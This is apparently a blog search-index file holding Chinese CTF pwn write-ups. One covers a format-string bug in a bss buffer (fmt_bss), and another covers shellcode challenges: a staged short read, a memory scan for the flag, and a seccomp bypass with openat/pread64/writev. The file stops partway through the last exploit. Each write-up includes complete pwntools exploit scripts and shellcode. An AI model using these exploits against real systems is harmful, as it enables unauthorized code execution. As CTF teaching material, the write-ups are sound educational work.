<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>fmt_bss</title>
    <link href="/2026/01/02/fmt-bss/"/>
    <url>/2026/01/02/fmt-bss/</url>
    
    <content type="html"><![CDATA[<p>今天依旧是一道格式化字符串漏洞的题目，题目出自NewStarCTF2025的week5pwn</p><p>hint:对于常规的栈上格式化字符串漏洞，可以任意构造自己的恶意数据来实现任意地址写，但是对于非栈上变量来说，就无法直接给出目的地址的指针，此时就需要留意栈上残留的内容，看看能不能找到可以利用的点(善用你的gdb)…</p><p>先来看看题目逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined8 <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">int</span> iVar1;<br>  <br>  setup();<br>  <span class="hljs-built_in">puts</span>(&amp;DAT_00102048);<br>  <span class="hljs-built_in">puts</span>(&amp;DAT_001020c0);<br>  <span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-built_in">memset</span>(global_buffer,<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">puts</span>(&amp;DAT_0010210d);   #一段嘲讽你的话<br>    read(<span class="hljs-number">0</span>,global_buffer,<span class="hljs-number">0xff</span>);<br>    <span class="hljs-built_in">printf</span>(global_buffer);  <span class="hljs-meta">#xswlhhh</span><br>    iVar1 = <span class="hljs-built_in">strcmp</span>(global_buffer,<span class="hljs-string">&quot;end\n&quot;</span>);<br>  &#125; <span class="hljs-keyword">while</span> (iVar1 != <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(&amp;DAT_0010211a);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>存在后门函数<code>win</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">win</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  FILE *__stream;<br>  <span class="hljs-type">long</span> in_FS_OFFSET;<br>  <span class="hljs-type">char</span> local_58 [<span class="hljs-number">72</span>];<br>  <span class="hljs-type">long</span> local_10;<br>  <br>  local_10 = *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<br>  __stream = fopen(<span class="hljs-string">&quot;/flag&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">if</span> (__stream == (FILE *)<span class="hljs-number">0x0</span>) &#123;<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  fgets(local_58,<span class="hljs-number">0x40</span>,__stream);<br>  <span class="hljs-built_in">printf</span>(&amp;DAT_00102010,local_58);<br>  fclose(__stream);<br>  <span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>    __stack_chk_fail();<br>  &#125;<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>明显存在格式化字符串漏洞，但是对比<code>bss_got</code>的不同之处在于之前我们输入形如<code>AAAA.%p.%p.%p.%p</code>可以看到A写在哪里以实现任意地址写，这次是bss段上的fmt，因此并没有那么容易任意写，我们看看有哪些可以利用的地方，比如，栈上残留的某个<strong>指针</strong>?</p><p><img src="/images/7.png" alt="stack"></p><p>经过敏锐的观察，不难发现，第6个地址0x7fffffffdda0与第26个地址0x7fffffffde00在栈上存在着某种关系…</p><p><code>0x7fffffffdda0 —▸ 0x7fffffffde00 ◂— 0</code></p><p>怎么理解呢，二者也就是<strong>指针</strong>的关系</p><p>0x7fffffffdda0是一个栈地址，存储着值0x7fffffffde00(即指向这个地址的指针)</p><p>0x7fffffffde00是另一个栈地址，这里存储着0</p><p>那么就有思路了，我们用逐字节写的方式修改<code>0x7fffffffdda0</code>处的指针，使其指向返回地址(rip)的位置，同理，用逐字节写的方式修改<code>0x7fffffffde00</code>处的值为win函数所在的地址</p><p>可能略微有点抽象，但结果就是，返回地址(rip)变为了<code>0x7fffffffdda0</code>，而这又是一个指向<code>0x7fffffffde00</code>的指针，而<code>0x7fffffffde00</code>处的值已经被我们改写为了<code>win</code>，从而获得了<code>flag</code></p><p>真是精妙绝伦啊~</p><p>还有一点需要注意的是，程序是<code>pie enabled</code>(区别于<code>ASLR</code>)，但是也很明显，可以通过泄露的第一个地址<code>0x555555558060</code>获得pie基址</p><p><img src="/images/8.png" alt="vmmap"></p><p>使用vmmap可以看到<code>pie_base = p1 - 0x4060</code></p><p>那么<code>win = pie_base + win偏移</code></p><p>接下来就来展示一下exp吧…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br>p = remote(<span class="hljs-string">&#x27;host&#x27;</span>,port)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;%p&#x27;</span>)<br>p_base = <span class="hljs-built_in">int</span>(p.recvline(keepends=<span class="hljs-literal">False</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x004060</span>    <span class="hljs-comment">#不保留换行符</span><br>log.success(<span class="hljs-string">f&#x27;p_base -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(p_base)&#125;</span>&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;%p %p %p %p %p %p&#x27;</span>)<br>rip = <span class="hljs-built_in">int</span>(p.recvline(keepends=<span class="hljs-literal">False</span>).decode().split(<span class="hljs-string">&#x27; &#x27;</span>)[-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) - <span class="hljs-number">0x98</span>  <span class="hljs-comment">#计算rip，由图可知rip = p6 - 0x98</span><br>log.success(<span class="hljs-string">f&#x27;rip -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)&#125;</span>&#x27;</span>)<br><br>win = p_base + <span class="hljs-number">0x001289</span>  <span class="hljs-comment">#objdump -d ./bss_fmt | grep &quot;win&quot;</span><br>log.success(<span class="hljs-string">f&#x27;win -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(win)&#125;</span>&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;rip%(<span class="hljs-number">256</span>*<span class="hljs-number">256</span>)&#125;</span>c%6$hn&#x27;</span>.encode())  <span class="hljs-comment">#改为rip</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;win%<span class="hljs-number">256</span>&#125;</span>c%26$hhn&#x27;</span>.encode())  <span class="hljs-comment">#重复逐字节写...</span><br>win //= <span class="hljs-number">256</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;rip%<span class="hljs-number">256</span>+<span class="hljs-number">1</span>&#125;</span>c%6$hhn&#x27;</span>.encode())<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;win%<span class="hljs-number">256</span>&#125;</span>c%26$hhn&#x27;</span>.encode())<br>win //= <span class="hljs-number">256</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;rip%<span class="hljs-number">256</span>+<span class="hljs-number">2</span>&#125;</span>c%6$hhn&#x27;</span>.encode())<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;win%<span class="hljs-number">256</span>&#125;</span>c%26$hhn&#x27;</span>.encode())<br>win //= <span class="hljs-number">256</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;rip%<span class="hljs-number">256</span>+<span class="hljs-number">3</span>&#125;</span>c%6$hhn&#x27;</span>.encode())<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;win%<span class="hljs-number">256</span>&#125;</span>c%26$hhn&#x27;</span>.encode())<br>win //= <span class="hljs-number">256</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;rip%<span class="hljs-number">256</span>+<span class="hljs-number">4</span>&#125;</span>c%6$hhn&#x27;</span>.encode())<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;win%<span class="hljs-number">256</span>&#125;</span>c%26$hhn&#x27;</span>.encode())<br>win //= <span class="hljs-number">256</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;rip%<span class="hljs-number">256</span>+<span class="hljs-number">5</span>&#125;</span>c%6$hhn&#x27;</span>.encode())<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;win%<span class="hljs-number">256</span>&#125;</span>c%26$hhn&#x27;</span>.encode())  <span class="hljs-comment">#计划，通!</span><br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>也是成功拿到<code>flag</code>了~</p><p>经过此题，应该能更加深刻地理解指针的本质，希望你能有所收获</p><p>感谢阅读…</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>shellcode</title>
    <link href="/2026/01/02/shellcode/"/>
    <url>/2026/01/02/shellcode/</url>
    
    <content type="html"><![CDATA[<p>今天来分享一下关于shellcode编写技术的一些题目，在此之前，需要你对x86-64的汇编指令，寄存器调用约定，栈有一定了解</p><p>先来讲比较简单的ret2shellcode技术</p><p>前提条件是<code>NX</code>保护没开，即栈可执行</p><p>因此可以直接使用pwntools的一个非常强大的集成功能</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>shellcode = asm(shellcraft.sh())<br></code></pre></td></tr></table></figure><p>通常payload是:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = shellcode + 偏移 + addr_to_shellcode(返回地址)<br></code></pre></td></tr></table></figure><p>此时shellcode在栈上，你可能需要先泄露栈地址，当然在本地可以用gdb一眼看出</p><p>当然在这方面还有<code>ret2reg</code>,<code>NOP sled</code>等技术，就不展开了(´・ω・&#96;)，感兴趣可以自行查阅资料</p><p>下面分享一些我遇到的与shellcode编写相关的题目</p><p>这些题目普遍与<code>mmap</code>(Memory Map)相关，其是Unix&#x2F;Linux提供的一种将文件或设备映射到进程虚拟内存空间的机制，使得文件内容可以像操作普通内存一样被访问</p><p>先来看第一题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined8 <span class="hljs-title function_">main</span><span class="hljs-params">(EVP_PKEY_CTX *param_1)</span><br>&#123;<br>  code *__buf;<br>  init(param_1);<br>  __buf = (code *)mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0x114514</span>,<span class="hljs-number">0x1000</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0x22</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;please input a small function (also after compile)&quot;</span>);<br>  read(<span class="hljs-number">0</span>,__buf,<span class="hljs-number">0x14</span>);<br>  clear();<br>  (*__buf)();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>mmap((void *)0x114514,0x1000,7,0x22,-1,0)</code>怎么理解呢，<code>0x114514</code>代表指定映射的期望地址,但也不一定必须是这儿(xswl),<code>0x1000</code>代表长度，这里是映射一页(4KB),7代表权限为<code>RWX</code>，可读可写可执行，这是关键，后面则表示这是一个纯内存页，不关联任何文件</p><p>所以这道题便很好理解了，直接把编写好的shellcode写入buf即可，接下来程序便会直接将其当作函数指针调用，并执行你的shellcode</p><p>但是关键点在于buf的长度只有0x14(20)，所以我们手动放大一下</p><p>首先关于read(0,buf,0x14)的寄存器调用约定，rax存放read的系统调用号0，rdi为第一个调用的寄存器，是fd(0,stdin)，rsi第二个，为buf的起始地址，rdx是读取的大小，最后执行<code>syscall</code>，就相当于执行了这么一个读取的指令</p><p>要扩大读取范围，我们将rdx修改为<code>0xff</code>(应该够了，注意限制，尽量少用一点字节数)，把rsi设置为当前的rip后0x20(大于0x14即可，同样限制一下字节数)的地址，调用syscall，写入shellcode，最后跳转rsi执行即可</p><p>我的exp，只用了13字节便成功改写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = remote(<span class="hljs-string">&#x27;host&#x27;</span>,port)<br>p.recvuntil(<span class="hljs-string">b&quot;compile)\n&quot;</span>)<br><br>stage1 = (<br>    <span class="hljs-string">b&quot;\x48\x8d\x35\x20\x00\x00\x00&quot;</span>  <span class="hljs-comment"># lea rsi, [rip+0x20]</span><br>    <span class="hljs-string">b&quot;\xb2\xff&quot;</span>                      <span class="hljs-comment"># mov dl, 0xff  只写2字节，极限</span><br>    <span class="hljs-string">b&quot;\x0f\x05&quot;</span>                      <span class="hljs-comment"># syscall</span><br>    <span class="hljs-string">b&quot;\xff\xe6&quot;</span>                      <span class="hljs-comment"># jmp rsi</span><br>)<br><br>p.send(stage1)<br><br>time.sleep(<span class="hljs-number">0.05</span>)  <span class="hljs-comment"># 留一点时间读取shellcode</span><br><br>stage2 = asm(shellcraft.sh())<br>p.send(stage2.ljust(<span class="hljs-number">0xff</span>, <span class="hljs-string">b&quot;\x90&quot;</span>))  <span class="hljs-comment"># nop填满buf，避免rubbish</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>拿下!</p><p>接下来看第二题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python">void main(EVP_PKEY_CTX *param_1)<br>&#123;<br>  <span class="hljs-built_in">int</span> iVar1;<br>  char *__s;<br>  size_t sVar2;<br>  size_t __n;<br>  long lVar3;<br>  undefined8 *puVar4;<br>  long in_FS_OFFSET;<br>  byte bVar5;<br>  undefined8 local_218;<br>  undefined8 local_210;<br>  undefined8 local_208 [<span class="hljs-number">63</span>];<br>  undefined8 local_10;<br>  <br>  bVar5 = <span class="hljs-number">0</span>;<br>  local_10 = *(undefined8 *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>); <span class="hljs-comment"># canary</span><br>  init(param_1);   <span class="hljs-comment">#初始化函数</span><br>  local_218 = <span class="hljs-number">0</span>;<br>  local_210 = <span class="hljs-number">0</span>;<br>  puVar4 = local_208;<br>  <span class="hljs-keyword">for</span> (lVar3 = <span class="hljs-number">0x3e</span>; lVar3 != <span class="hljs-number">0</span>; lVar3 = lVar3 + -<span class="hljs-number">1</span>) &#123;<br>    *puVar4 = <span class="hljs-number">0</span>;<br>    puVar4 = puVar4 + (ulong)bVar5 * -<span class="hljs-number">2</span> + <span class="hljs-number">1</span>;<br>  &#125;<br>  *(undefined1 *)puVar4 = <span class="hljs-number">0</span>;<br>  __s = (char *)read_flag(<span class="hljs-string">&quot;/flag&quot;</span>);  <span class="hljs-comment">#关键</span><br>  sVar2 = strlen(__s);<br>  __s[sVar2] = <span class="hljs-string">&#x27;H&#x27;</span>;<br>  __s[sVar2 + <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;1&#x27;</span>;<br>  __s[sVar2 + <span class="hljs-number">2</span>] = -<span class="hljs-number">0x40</span>;   <span class="hljs-comment">#xor rax,rax</span><br>  puts(<span class="hljs-string">&quot;I forgot the flag.&quot;</span>);<br>  puts(<span class="hljs-string">&quot;Can you find it?&quot;</span>);<br>  printf(<span class="hljs-string">&quot; &gt; &quot;</span>);<br>  __n = read(<span class="hljs-number">0</span>,&amp;local_218,<span class="hljs-number">0x200</span>);<br>  <span class="hljs-keyword">if</span> (__n == <span class="hljs-number">0</span>) &#123;<br>    perror(<span class="hljs-string">&quot;read&quot;</span>);<br>                    /* WARNING: Subroutine does <span class="hljs-keyword">not</span> <span class="hljs-keyword">return</span> */<br>    exit(<span class="hljs-number">1</span>);<br>  &#125;<br>  memcpy(__s + sVar2 + <span class="hljs-number">3</span>,&amp;local_218,__n);<br>  iVar1 = mprotect(__s,<span class="hljs-number">0x1000</span>,<span class="hljs-number">5</span>);   <span class="hljs-comment">#可执行</span><br>  <span class="hljs-keyword">if</span> (iVar1 == -<span class="hljs-number">1</span>) &#123;<br>    perror(<span class="hljs-string">&quot;mprotect&quot;</span>);<br>                    /* WARNING: Subroutine does <span class="hljs-keyword">not</span> <span class="hljs-keyword">return</span> */<br>    exit(<span class="hljs-number">1</span>);<br>  &#125;<br>  install_seccomp();<br>                    /* WARNING: Could <span class="hljs-keyword">not</span> recover jumptable at <span class="hljs-number">0x0010169d</span>. Too many branches */<br>                    /* WARNING: Treating indirect jump <span class="hljs-keyword">as</span> call */<br>  (*(code *)(__s + sVar2))(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);  <span class="hljs-comment">#执行</span><br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>read_flag函数为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">void * read_flag(char *param_1)<br>&#123;<br>  <span class="hljs-built_in">int</span> __fd;<br>  void *pvVar1;<br>  <br>  __fd = <span class="hljs-built_in">open</span>(param_1,<span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> (__fd &lt; <span class="hljs-number">0</span>) &#123;<br>    perror(<span class="hljs-string">&quot;Can\&#x27;t open flag file: &quot;</span>);<br>                    /* WARNING: Subroutine does <span class="hljs-keyword">not</span> <span class="hljs-keyword">return</span> */<br>    exit(<span class="hljs-number">1</span>);<br>  &#125;<br>  pvVar1 = mmap((void *)<span class="hljs-number">0x0</span>,<span class="hljs-number">0x1000</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,__fd,<span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> (pvVar1 == (void *)<span class="hljs-number">0xffffffffffffffff</span>) &#123;<br>    perror(<span class="hljs-string">&quot;mmap&quot;</span>);<br>                    /* WARNING: Subroutine does <span class="hljs-keyword">not</span> <span class="hljs-keyword">return</span> */<br>    exit(<span class="hljs-number">1</span>);<br>  &#125;<br>  close(__fd);<br>  <span class="hljs-keyword">return</span> pvVar1;<br>&#125;<br></code></pre></td></tr></table></figure><p>题目逻辑非常清晰，也很贴心，程序先把flag文件的内容直接读到内存里，然后在flag结尾拼接你输入的数据(我们写的shellcode)，再把这整块内存改成RX(可执行)，最后从flag末尾开始当函数执行你的shellcode，所以解法也是很简单，直接在mmap空间搜索<code>flag{}</code>字符串即可</p><p>这里涉及到如何编写汇编</p><p>我先直接放一下我写的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br>io = remote(<span class="hljs-string">&#x27;host&#x27;</span>,port)<br><br>shellcode = asm(<span class="hljs-string">r&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    lea rbx, [rip]  #加载地址</span><br><span class="hljs-string"></span><br><span class="hljs-string">find_flag:</span><br><span class="hljs-string">    dec rbx          # rbx=rbx-1 循环</span><br><span class="hljs-string">    cmp dword ptr [rbx], 0x67616c66   # flag字符串</span><br><span class="hljs-string">    jne find_flag    #条件跳转,不是flag继续往前找,注意byte dword qword区别 </span><br><span class="hljs-string">    cmp byte ptr [rbx+4], 0x7b        #&#123; 二次验证</span><br><span class="hljs-string">    jne find_flag</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rsi, rbx      #到这里已经找到了，先将rsi设置为flag的起始地址</span><br><span class="hljs-string">    xor rdx, rdx      #len先设置为0，读取flag直到&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">len_scan:</span><br><span class="hljs-string">    cmp byte ptr [rsi + rdx], 0x7d   #&#125;</span><br><span class="hljs-string">    je write_flag</span><br><span class="hljs-string">    inc rdx             #rdx=rdx+1</span><br><span class="hljs-string">    jmp len_scan</span><br><span class="hljs-string"></span><br><span class="hljs-string">write_flag:</span><br><span class="hljs-string">    inc rdx          #加上&#125;</span><br><span class="hljs-string">    mov rdi, 1        #stdout</span><br><span class="hljs-string">    mov rax, 1         #write系统调用号</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rax, 60       #exit</span><br><span class="hljs-string">    xor rdi, rdi      #rdi=0</span><br><span class="hljs-string">    syscall         #安全退出程序</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br>io.recvuntil(<span class="hljs-string">b&#x27;&gt; &#x27;</span>)<br>io.send(shellcode)<br>io.interactive()<br></code></pre></td></tr></table></figure><p>直接看注释吧，应该蛮好理解的…</p><p>接下来看第三题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined8 <span class="hljs-title function_">main</span><span class="hljs-params">(EVP_PKEY_CTX *param_1)</span><br>&#123;<br>  code *__buf;<br>  <br>  init(param_1);<br>  __buf = (code *)mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0x114514</span>,<span class="hljs-number">0x1000</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0x22</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;please input a orw_plus function (also also after compile)&quot;</span>);<br>  read(<span class="hljs-number">0</span>,__buf,<span class="hljs-number">0x500</span>);<br>  install_seccomp();<br>  (*__buf)();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>题目逻辑和第一题一模一样，不同之处在于开启了seccomp，发现其禁用了execve,open,read,write,sendfile,没招了吗,不,其实还有很多的类似功能的<code>orw</code>供聪明的我们使用，这里我用的是<code>openat</code>,<code>pread64</code>和<code>writev</code></p><p>直接看exp吧…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 